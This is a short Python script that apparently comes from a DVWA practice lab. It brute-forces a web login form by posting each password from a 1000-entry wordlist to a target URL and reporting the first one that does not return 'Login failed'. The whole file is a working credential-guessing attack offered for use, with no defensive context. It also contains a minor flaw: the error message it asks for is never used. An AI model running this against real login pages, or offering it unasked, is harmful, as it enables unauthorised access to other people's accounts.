import requests

# display source code and change the variables below (This values for dvwa)
input_user_name = "username"
input_pass_name = "password"
input_submit_name = "Login"

target_url = raw_input("Target URL: ")
error_message = raw_input("Error Message: ")
user = raw_input("Username: ")
data_dict = {input_user_name: user, input_pass_name: "lalatest", input_submit_name: "submit"}

with open("/root/PycharmProjects/login-guess/1000-passwords.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content:
            print("Found Password --> "+word)
            exit()


print("[-] Found Nothing :(")
